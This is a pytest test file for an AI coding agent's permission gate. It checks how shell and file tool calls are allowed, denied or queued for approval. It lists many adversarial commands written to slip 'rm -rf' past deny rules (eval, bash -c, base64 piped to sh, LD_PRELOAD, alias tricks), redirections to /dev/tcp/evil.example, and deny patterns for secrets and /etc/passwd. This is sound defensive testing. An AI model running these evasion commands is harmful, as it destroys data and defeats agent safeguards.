from typing import Any

import pytest
from pydantic import BaseModel

from harness.agent.gate import (
    GateDecision,
    Mode,
    Policy,
    Rule,
    decide,
    inside_workspace,
    session_rules,
    split_command,
    subject,
)
from harness.agent.tools import Tool, ToolContext, ToolOutput
from harness.core.events import (
    ApprovalRequested,
    ApprovalResolved,
    Event,
    EventBody,
    UserMessage,
    make_event,
)
from harness.tools import default_tools
from harness.tools.files import resolve_path

TOOLS = {tool.name: tool for tool in default_tools()}


class WebArgs(BaseModel):
    url: str


async def _noop(args: WebArgs, ctx: ToolContext) -> ToolOutput:
    return ToolOutput(content="")


WEB = Tool(
    name="web", description="fetch", args_model=WebArgs, side_effect="external", handler=_noop
)


def gate(
    tool: Tool[Any],
    arguments: dict[str, Any],
    *,
    mode: Mode = "ask",
    allow: tuple[str, ...] = (),
    deny: tuple[str, ...] = (),
    session: tuple[str, ...] = (),
    cwd: str = ".",
) -> GateDecision:
    def rules(specs: tuple[str, ...]) -> tuple[Rule, ...]:
        return tuple(Rule(tool=s.partition(":")[0], pattern=s.partition(":")[2]) for s in specs)

    return decide(
        tool=tool,
        arguments=arguments,
        cwd=cwd,
        mode=mode,
        policy=Policy(allow=rules(allow), deny=rules(deny)),
        session_allow=rules(session),
    )


def bash(command: str, **kwargs: Any) -> GateDecision:
    return gate(TOOLS["bash"], {"command": command}, **kwargs)


CASES: list[tuple[str, Tool[Any], dict[str, Any], dict[str, str]]] = [
    (
        "read-only",
        TOOLS["read"],
        {"path": "src/a.py"},
        {"ask": "allow", "auto-edit": "allow", "yolo": "allow"},
    ),
    (
        "read-only outside",
        TOOLS["grep"],
        {"pattern": "x", "path": "/etc"},
        {"ask": "allow", "auto-edit": "allow", "yolo": "allow"},
    ),
    (
        "edit inside",
        TOOLS["edit"],
        {"path": "src/a.py", "old_string": "a", "new_string": "b"},
        {"ask": "ask", "auto-edit": "allow", "yolo": "allow"},
    ),
    (
        "write inside",
        TOOLS["write"],
        {"path": "new.txt", "content": "x"},
        {"ask": "ask", "auto-edit": "allow", "yolo": "allow"},
    ),
    (
        "edit outside",
        TOOLS["edit"],
        {"path": "../x.py", "old_string": "a", "new_string": "b"},
        {"ask": "ask", "auto-edit": "ask", "yolo": "allow"},
    ),
    (
        "edit absolute",
        TOOLS["edit"],
        {"path": "/etc/passwd", "old_string": "a", "new_string": "b"},
        {"ask": "ask", "auto-edit": "ask", "yolo": "allow"},
    ),
    (
        "bash",
        TOOLS["bash"],
        {"command": "ls"},
        {"ask": "ask", "auto-edit": "ask", "yolo": "allow"},
    ),
    ("external", WEB, {"url": "https://x"}, {"ask": "ask", "auto-edit": "ask", "yolo": "allow"}),
]


@pytest.mark.parametrize("mode", ["ask", "auto-edit", "yolo"])
@pytest.mark.parametrize(
    ("name", "tool", "arguments", "expected"), CASES, ids=[c[0] for c in CASES]
)
def test_mode_defaults(
    mode: Mode, name: str, tool: Tool[Any], arguments: dict[str, Any], expected: dict[str, str]
) -> None:
    decision = gate(tool, arguments, mode=mode)
    assert decision.action == expected[mode]
    assert decision.rule == f"mode:{mode}"
    assert decision.reason


def test_edit_inside_workspace_from_a_subdirectory_cwd() -> None:
    args = {"path": "../x.py", "old_string": "a", "new_string": "b"}
    assert gate(TOOLS["edit"], args, mode="auto-edit", cwd="sub").action == "allow"
    assert gate(TOOLS["edit"], args, mode="auto-edit", cwd=".").action == "ask"


def test_absolute_cwd_makes_relative_edits_outside() -> None:
    args = {"path": "a.py", "old_string": "a", "new_string": "b"}
    assert gate(TOOLS["edit"], args, mode="auto-edit", cwd="/tmp").action == "ask"


def test_deny_wins_in_yolo() -> None:
    decision = bash("rm -rf /", mode="yolo", deny=("bash:rm -rf*",))
    assert decision == GateDecision(action="deny", rule="bash:rm -rf*", reason=decision.reason)
    edit = gate(
        TOOLS["write"],
        {"path": "secrets/key", "content": ""},
        mode="yolo",
        deny=("write:secrets/*",),
    )
    assert (edit.action, edit.rule) == ("deny", "write:secrets/*")


def test_deny_beats_allow_rule() -> None:
    decision = gate(TOOLS["read"], {"path": ".env"}, allow=("read:*",), deny=("read:.env",))
    assert (decision.action, decision.rule) == ("deny", "read:.env")


def test_deny_on_a_read_only_tool_in_ask_mode() -> None:
    assert gate(TOOLS["read"], {"path": ".env"}, deny=("read:.env",)).action == "deny"


def test_deny_rule_for_another_tool_does_not_apply() -> None:
    assert gate(TOOLS["read"], {"path": ".env"}, deny=("write:.env",)).action == "allow"


def test_compound_with_a_denied_subcommand_is_denied() -> None:
    decision = bash("ls && rm -rf /", allow=("bash:ls*",), deny=("bash:rm -rf*",))
    assert (decision.action, decision.rule) == ("deny", "bash:rm -rf*")


def test_compound_with_an_unallowed_subcommand_asks() -> None:
    decision = bash("ls && cat x", allow=("bash:ls*",))
    assert (decision.action, decision.rule) == ("ask", "mode:ask")


def test_every_subcommand_allowed_gives_allow() -> None:
    decision = bash("ls; ls", allow=("bash:ls*",))
    assert (decision.action, decision.rule) == ("allow", "bash:ls*")


def test_allow_by_rule_in_auto_edit() -> None:
    assert bash("ls -la", mode="auto-edit", allow=("bash:ls*",)).action == "allow"


def test_command_substitution_asks_outside_yolo() -> None:
    assert bash("echo $(rm -rf x)", allow=("bash:echo*",)).action == "ask"
    assert bash("echo $(rm -rf x)", mode="yolo", allow=("bash:echo*",)).action == "allow"


def test_session_rules_allow() -> None:
    decision = bash("git status", session=("bash:git status*",))
    assert (decision.action, decision.rule) == ("allow", "bash:git status*")


def test_session_rules_never_beat_deny() -> None:
    decision = bash("rm -rf x", session=("bash:*",), deny=("bash:rm -rf*",))
    assert decision.action == "deny"


def test_file_allow_rule() -> None:
    args = {"path": "../shared/a.py", "content": ""}
    decision = gate(TOOLS["write"], args, allow=("write:../shared/*",))
    assert (decision.action, decision.rule) == ("allow", "write:../shared/*")


def test_tool_without_subject_matches_star() -> None:
    assert subject("web", {"url": "https://x"}, ".") == "*"
    assert gate(WEB, {"url": "https://x"}, allow=("web:*",)).action == "allow"
    assert gate(WEB, {"url": "https://x"}, allow=("web:https*",)).action == "ask"


def test_empty_bash_command_never_matches_an_allow_rule() -> None:
    assert bash("", allow=("bash:*",)).action == "ask"
    assert bash("  # just a comment", allow=("bash:*",)).action == "ask"


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("ls", ["ls"]),
        ("ls; ls", ["ls", "ls"]),
        ("a && b || c | d & e", ["a", "b", "c", "d", "e"]),
        ("a\nb", ["a", "b"]),
        ("a |& b", ["a", "b"]),
        ("echo 'a && b'", ["echo 'a && b'"]),
        ('echo "a; b" c', ['echo "a; b" c']),
        ("echo a\\;b", ["echo a\\;b"]),
        ("echo $'it\\'s; fine'", ["echo $'it\\'s; fine'"]),
        ("make 2>&1 | tee log", ["make 2>&1", "tee log"]),
        ("ls &> /dev/null; ls >& out", ["ls &> /dev/null", "ls >& out"]),
        ("ls >| out", ["ls >| out"]),
        ("ls # trailing; rm -rf x", ["ls"]),
        ("ls a#b", ["ls a#b"]),
        ("ls #c \\\nrm -rf x", ["ls", "rm -rf x"]),
        ("ls \\\n -la", ["ls \\\n -la"]),
        ("  a ;; ;  b  ", ["a", "b"]),
        ("(cd sub && ls)", ["cd sub", "ls"]),
        ("ls $HOME ${HOME}", ["ls $HOME ${HOME}"]),
    ],
)
def test_split_command(command: str, expected: list[str]) -> None:
    assert split_command(command) == expected


@pytest.mark.parametrize(
    "command",
    [
        "echo `rm -rf x`",
        "echo $(rm -rf x)",
        'echo "$(rm -rf x)"',
        "diff <(ls a) <(ls b)",
        "tee >(cat)",
        "cat <<EOF\nhi\nEOF",
        "cat <<< hi",
        "echo 'unbalanced",
        'echo "unbalanced',
        "echo $'unbalanced",
        "echo ${x:-$(rm -rf y)}",
        "echo ${y:='a[$(rm -rf q)]'} ${z:y}",
        "echo ${x@P}",
        "echo $[1+2]",
        "((x = 1 + 2))",
        "ls >",
    ],
)
def test_split_command_unanalyzable(command: str) -> None:
    assert split_command(command) is None


@pytest.mark.parametrize(
    ("path", "cwd", "inside"),
    [
        ("src/a.py", ".", True),
        ("../x", ".", False),
        ("../x", "sub", True),
        ("/etc/passwd", ".", False),
        ("..", ".", False),
        ("a/../../x", ".", False),
        ("..foo", ".", True),
        ("x", "/abs", False),
    ],
)
def test_inside_workspace(path: str, cwd: str, inside: bool) -> None:
    assert inside_workspace(path, cwd) is inside


@pytest.mark.parametrize(
    ("path", "cwd"),
    [
        ("src/a.py", "."),
        ("./src/../a.py", "sub"),
        ("../x", "a/b"),
        ("/etc/passwd", "."),
        ("/tmp/../etc/passwd", "sub"),
        ("", "."),
        ("x", "/abs/dir"),
    ],
)
def test_subject_agrees_with_tool_path_resolution(path: str, cwd: str) -> None:
    for name in ("read", "write", "edit", "grep", "glob"):
        assert subject(name, {"path": path}, cwd) == resolve_path(cwd, path)


def test_subject_for_bash_is_the_command() -> None:
    assert subject("bash", {"command": "ls -la"}, "sub") == "ls -la"


def test_grep_without_path_uses_its_default() -> None:
    decision = gate(TOOLS["grep"], {"pattern": "x"}, cwd="sub", deny=("grep:sub",))
    assert decision.action == "deny"


def _events(*bodies: EventBody) -> list[Event]:
    return [make_event(seq, body) for seq, body in enumerate(bodies)]


def test_session_rules_reads_only_allow_always() -> None:
    events = _events(
        UserMessage(text="hi"),
        ApprovalRequested(call_id="c0", risk="mutating"),
        ApprovalResolved(call_id="c1", decision="allow", rule="bash:ls*"),
        ApprovalResolved(call_id="c2", decision="deny", rule="bash:rm*"),
        ApprovalResolved(call_id="c3", decision="allow_always", rule="bash:git status*"),
        ApprovalResolved(call_id="c4", decision="allow_always", rule="write:src/a:b.py"),
    )
    assert session_rules(events) == [
        Rule(tool="bash", pattern="git status*"),
        Rule(tool="write", pattern="src/a:b.py"),
    ]


@pytest.mark.parametrize("rule", [None, "", "nocolon", ":ls*", "bash:"])
def test_session_rules_ignores_malformed_rules(rule: str | None) -> None:
    events = _events(ApprovalResolved(call_id="c1", decision="allow_always", rule=rule))
    assert session_rules(events) == []


def test_rule_display_form() -> None:
    assert Rule(tool="bash", pattern="ls*").display == "bash:ls*"


ALLOW_ALL = {"allow": ("bash:*",), "deny": ("bash:rm -rf*",)}


@pytest.mark.parametrize(
    "command",
    [
        "rm  -rf x",
        "FOO=1 rm -rf x",
        "\\rm -rf x",
        "r''m -rf x",
        '"rm" -rf x',
        "/bin/rm -rf x",
        "(rm -rf x)",
        "{ rm -rf x; }",
        "if true; then rm -rf x; fi",
        "! rm -rf x",
        "ls\nrm -rf x",
        "command rm -rf x",
        "exec rm -rf x",
        "env -i FOO=1 rm -rf x",
        "sudo -u root rm -rf x",
        "nice -n 5 rm -rf x",
        "timeout -s KILL 5 rm -rf x",
        "time -p rm -rf x",
        "nohup rm -rf x &",
        "eval 'rm -rf x'",
        'eval "rm" -rf x',
        "bash -c 'rm -rf x'",
        "sh -ec 'ls; rm -rf x'",
        "bash -o pipefail -c 'rm -rf x'",
        "eval \"bash -c 'rm -rf x'\"",
        "find . -name '*.py' -exec rm -rf {} +",
        "ls | xargs rm -rf",
        "ls | xargs -n 1 rm -rf",
        "su -c 'rm -rf x'",
        "busybox rm -rf x",
        "echo $(rm -rf x)",
        "echo `rm -rf x`",
        "echo \"$(eval 'rm -rf x')\"",
        "2>/dev/null rm -rf x",
        "f() { rm -rf x; }; f",
        "coproc rm -rf x",
        "cat <(rm -rf x)",
        "rm -rf x # comment",
    ],
)
def test_adversarial_denied_command_is_denied(command: str) -> None:
    assert bash(command, **ALLOW_ALL).action == "deny"
    assert bash(command, mode="yolo", **ALLOW_ALL).action == "deny"


@pytest.mark.parametrize(
    "command",
    [
        "x=rm; $x -rf y",
        "${x} -rf y",
        "{rm,-rf,y}",
        "/bin/r? -rf y",
        "/bin/r[m] -rf y",
        'eval "$cmd"',
        'bash -c "$cmd"',
        "bash -c $'rm\\x20-rf y'",
        "$'\\x72m' -rf y",
        "echo cm0gLXJmIHkK | base64 -d | sh",
        "bash script.sh",
        "bash <<< 'rm -rf y'",
        "source ./x.sh",
        ". ./x.sh",
        "trap 'rm -rf y' EXIT",
        "shopt -s expand_aliases\nalias ls='rm -rf y'\nls",
        "let 'x=a[1]'",
        "[[ $x -eq 1 ]]",
        "declare -i y=x",
        "printf -v 'a[x]' 1",
        "mapfile -C cb -c 1 < f",
        "enable -f ./evil.so evil",
        "hash -p /bin/rm ls; ls -rf y",
        "PS4='$(rm -rf y)' bash -xc ls",
        "BASH_ENV=./evil.sh bash -c ls",
        "LD_PRELOAD=./evil.so ls",
        "PATH=.:$PATH; ls",
        "export PATH=.",
        "x='a[$''(rm -rf y)]'; echo $x",
        "find . -exec {} \\;",
        "ls | xargs sh -c",
        "sudo -s",
        "su",
        "env -S 'rm -rf y'",
        "stdbuf --weird rm -rf y",
        "bash -c 'echo `x`'",
        "eval 'ls; echo \"'",
    ],
)
def test_adversarial_opaque_command_is_never_allowed_by_rule(command: str) -> None:
    decision = bash(command, **ALLOW_ALL)
    assert decision.action in ("deny", "ask"), decision


@pytest.mark.parametrize(
    "command",
    [
        "ls > out.txt",
        "ls >> ~/.bashrc",
        "ls >| out",
        "ls &> out",
        "ls &>> out",
        "ls >& out",
        "ls 1> out",
        "ls <> out",
        "ls > $f",
        "ls > /dev/tcp/evil.example/80",
        "ls < /dev/udp/evil.example/53",
        "> out",
        "ls; > out",
    ],
)
def test_file_redirection_is_not_covered_by_an_allow_rule(command: str) -> None:
    assert bash(command, allow=("bash:ls*", "bash:>*")).action == "ask"


@pytest.mark.parametrize(
    "command",
    [
        "ls > /dev/null",
        "ls 2>/dev/null",
        "ls 2>&1",
        "ls >&2",
        "ls 2>&-",
        "ls < in.txt",
        "ls &>/dev/null",
    ],
)
def test_harmless_redirection_keeps_an_allow_rule(command: str) -> None:
    assert bash(command, allow=("bash:ls*",)).action == "allow"


@pytest.mark.parametrize(
    "command",
    [
        "ls\nrm -rf y",
        "ls & rm -rf y",
        "ls|rm -rf y",
        "ls $(rm -rf y)",
        "ls `rm -rf y`",
        "ls <(rm -rf y)",
        "ls ${y:='a[$(rm -rf q)]'} ${z:y}",
        "ls; FOO=1 rm -rf y",
        "LD_PRELOAD=x.so ls",
        "(ls) && rm -rf y",
        "ls; $x",
        "ls #\nrm -rf y",
        "ls \\\n; rm -rf y",
        "ls () { rm -rf y; }; ls",
        "if ls; then rm -rf y; fi",
    ],
)
def test_narrow_allow_rule_does_not_leak(command: str) -> None:
    assert bash(command, allow=("bash:ls*",)).action == "ask"


def test_ansi_c_quoting_splits_like_bash() -> None:
    assert split_command("ls $'\\'; rm -rf y; echo \\''") == ["ls $'\\'; rm -rf y; echo \\''"]
    assert split_command("ls $'a' ; rm") == ["ls $'a'", "rm"]


def test_opaque_without_deny_rules_does_not_block_a_broad_allow() -> None:
    assert bash("x=ls; $x", allow=("bash:*",)).action == "allow"


def test_unparseable_command_still_checks_deny_on_fragments() -> None:
    assert bash("rm -rf x; echo 'oops", deny=("bash:rm -rf*",)).action == "deny"


@pytest.mark.parametrize(
    "path",
    ["/tmp/../etc/passwd", "//etc/passwd", "/etc//passwd", "/etc/./passwd"],
)
def test_unnormalized_absolute_paths_still_hit_deny(path: str) -> None:
    decision = gate(TOOLS["read"], {"path": path}, mode="yolo", deny=("read:/etc/*",))
    assert decision.action == "deny"


def test_unnormalized_absolute_path_does_not_escape_an_allow_rule() -> None:
    args = {"path": "/tmp/../etc/passwd", "content": ""}
    assert gate(TOOLS["write"], args, allow=("write:/tmp/*",)).action == "ask"


def test_relative_escape_is_unverifiable_against_deny_rules() -> None:
    args = {"path": "../../etc/passwd", "content": ""}
    decision = gate(TOOLS["write"], args, allow=("write:*",), deny=("write:/etc/*",))
    assert decision.action == "ask"
    assert gate(TOOLS["write"], args, allow=("write:*",)).action == "allow"


def test_invalid_arguments_for_a_touching_tool_ask_in_auto_edit() -> None:
    assert gate(TOOLS["edit"], {"path": "a.py"}, mode="auto-edit").action == "ask"
    assert gate(TOOLS["edit"], {"path": ".env"}, deny=("edit:.env",)).action == "deny"


@pytest.mark.parametrize(
    "command",
    [
        "read 'a[x]' < f",
        "unset 'a[x]'",
        "a[x]=1",
        "test -v 'a[x]'",
        "[ -v 'a[x]' ]",
    ],
)
def test_arithmetic_evaluation_sites_are_opaque(command: str) -> None:
    assert bash(command, **ALLOW_ALL).action == "ask"


def test_nul_byte_makes_the_command_unanalyzable() -> None:
    assert split_command("rm\x00 -rf x") is None
    assert bash("ls\x00", allow=("bash:ls*",)).action == "ask"


def test_deep_nesting_is_unanalyzable_not_a_crash() -> None:
    command = "echo " + "$(" * 400 + "x" + ")" * 400
    assert split_command(command) is None
    assert bash(command, **ALLOW_ALL).action == "ask"
    braces = "echo " + "${x:-" * 400 + "}" * 400
    assert bash(braces, **ALLOW_ALL).action == "ask"


def test_wrapper_fan_out_is_bounded() -> None:
    command = " ".join(["stdbuf --weird"] * 60) + " ls"
    assert bash(command, **ALLOW_ALL).action == "ask"
